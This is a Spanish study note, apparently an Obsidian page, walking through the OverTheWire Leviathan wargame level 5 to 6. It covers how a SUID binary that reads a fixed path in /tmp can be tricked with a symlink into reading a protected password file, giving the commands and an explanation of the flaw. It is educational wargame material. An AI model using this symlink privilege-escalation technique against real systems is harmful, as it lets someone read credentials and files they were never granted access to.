---
title: Leviathan Nivel 5 a 6
date: 2026-06-14
tags: [ciberseguridad, linux, setuid, symlink, leviathan, wargame]
type: nota
status: en-progreso
source: claude-code
aliases: [Leviathan nivel 5, Leviathan 5 a 6, leviathan-symlink-suid]
---

# Leviathan Nivel 5 a 6

> Pagina oficial del nivel: https://overthewire.org/wargames/leviathan/leviathan6.html
> Marco: OverTheWire Leviathan es un wargame **legal y educativo** disenado para aprender explotacion basica de Linux. No es hacking malicioso.

---

## Objetivo

Abusar del binario SUID `leviathan5` para leer el fichero protegido `/etc/leviathan_pass/leviathan6` (solo legible por `leviathan6`) y obtener su contrasena.

---

## Que aprendes

| Concepto / Comando | Para que sirve |
|---|---|
| Bit SUID (`s` en permisos) | El binario se ejecuta con los privilegios de su **propietario**, no del usuario que lo lanza |
| `ln -s <origen> <destino>` | Crea un enlace simbolico (symlink): un puntero que redirige a otra ruta |
| Lectura de ruta fija en codigo | Si un programa abre siempre la misma ruta, controlar ese fichero equivale a controlar lo que el programa lee |
| `ls -la` | Ver permisos detallados, incluyendo el bit `s` y si un fichero es symlink (`l`) |
| `file` / `ltrace` | Confirmar que el binario es ELF y rastrear las llamadas a bibliotecas (open, fopen...) para descubrir que ruta abre |

### Concepto clave: SUID + ruta fija = escalada de privilegios via symlink

Un binario SUID que abre **siempre la misma ruta** delega la decision de "que fichero leer" al sistema de ficheros, no al codigo. Si esa ruta es un symlink que tu controlas, el proceso (corriendo como root o como otro usuario privilegiado) seguira el enlace y leera el destino con sus propios privilegios. Esto se llama **symlink attack** o **TOCTOU file-redirect**.

El patron es:

1. Identificas que ruta fija abre el binario SUID.
2. Si esa ruta esta en un directorio donde tienes permisos de escritura (`/tmp` es el caso tipico), creas un symlink en esa ruta apuntando al fichero protegido.
3. Al ejecutar el binario, este sigue el symlink y lee el fichero protegido con sus privilegios elevados.

---

## Paso a paso

### 1. Conectarte como leviathan5

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

Introduce `<pass_leviathan5>` cuando lo pida.

---

### 2. Explorar el directorio home y confirmar el SUID

```bash
ls -la ~/
```

Veras algo como:

```
-rwsr-xr-x 1 leviathan6 leviathan5 7492 Jan  1  2020 leviathan5
```

La `s` en el campo de permisos del propietario (`rws`) confirma el **bit SUID**: el proceso correra como `leviathan6` independientemente de quien lo ejecute.

---

### 3. Descubrir que ruta abre el binario (opcional pero didactico)

```bash
ltrace ~/leviathan5
```

Entre la salida veras una llamada similar a:

```
fopen("/tmp/file.log", "r")
```

Eso revela que el binario abre `/tmp/file.log` en modo lectura. Si el fichero no existe, el programa termina con error; si existe, imprime su contenido en pantalla.

---

### 4. Crear el symlink malicioso

```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```

Desglose:
- `ln -s` — crea un enlace simbolico (soft link).
- `/etc/leviathan_pass/leviathan6` — fichero protegido que solo puede leer `leviathan6`.
- `/tmp/file.log` — ruta que el binario SUID intentara abrir.

A partir de este momento, `/tmp/file.log` no es un fichero real: es un puntero al fichero de contrasena.

---

### 5. Ejecutar el binario SUID

```bash
~/leviathan5
```

Salida esperada:

```
<pass_leviathan6>
```

El proceso se ejecuto como `leviathan6`, siguio el symlink, leyo `/etc/leviathan_pass/leviathan6` y lo imprimio en tu terminal.

---

### 6. Limpieza (buena practica)

```bash
rm /tmp/file.log
```

Elimina el symlink para no dejar rastro en `/tmp`, que es compartido por todos los usuarios del servidor.

---

## Por que funciona

El binario tiene el bit SUID activado y su propietario es `leviathan6`. Cuando cualquier usuario lo ejecuta, el kernel cambia el **UID efectivo** del proceso a `leviathan6` antes de que el programa empiece a correr. Desde ese momento, todas las operaciones de fichero del proceso se comprueban con los permisos de `leviathan6`.

El codigo del binario abre la ruta `/tmp/file.log` sin ninguna comprobacion de si es un symlink o un fichero real. El kernel, al resolver la ruta, sigue el enlace simbolico de forma transparente y termina leyendo `/etc/leviathan_pass/leviathan6`. Como el proceso tiene permisos de `leviathan6`, la lectura es autorizada.

La vulnerabilidad no esta en el symlink en si, sino en la combinacion de tres factores:
1. Privilegios elevados via SUID.
2. Ruta de lectura fija sin validacion.
3. El usuario atacante tiene escritura en el directorio que contiene esa ruta (`/tmp`).

---

## Errores comunes

- **`/tmp/file.log` ya existe como fichero normal**: si hay un fichero real ahi de una ejecucion anterior, `ln -s` fallara con "File exists". Borralo primero con `rm /tmp/file.log` y vuelve a crear el symlink.
- **El binario imprime un error y no muestra nada**: probablemente el symlink apunta a una ruta incorrecta o mal escrita. Verifica con `ls -la /tmp/file.log` que el destino del enlace es exactamente `/etc/leviathan_pass/leviathan6`.
- **"Permission denied" al ejecutar `leviathan5`**: comprueba que tienes permisos de ejecucion (`x`) sobre el binario con `ls -la ~/leviathan5`. Si el bit SUID aparece como `S` (mayuscula) en vez de `s` (minuscula), el bit de ejecucion falta y el SUID no tendra efecto.
- **Confundir symlink con hardlink**: `ln` sin `-s` crearia un hardlink, que no puede apuntar a un fichero en otro sistema de ficheros ni a rutas protegidas de esta forma. Usa siempre `ln -s` para este tipo de ataque.

---

## Pasar al siguiente nivel

Con la contrasena obtenida, conéctate como `leviathan6`:

```bash
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

Introduce `<pass_leviathan6>` cuando lo pida.

---

## Conexiones

- [[Leviathan/00_README]]
- [[MOC_Ciberseguridad]]
- [[06-seguridad-de-sistemas-y-hardening]]
- [[13-herramientas-en-detalle]]
- Pagina oficial del nivel: https://overthewire.org/wargames/leviathan/leviathan6.html
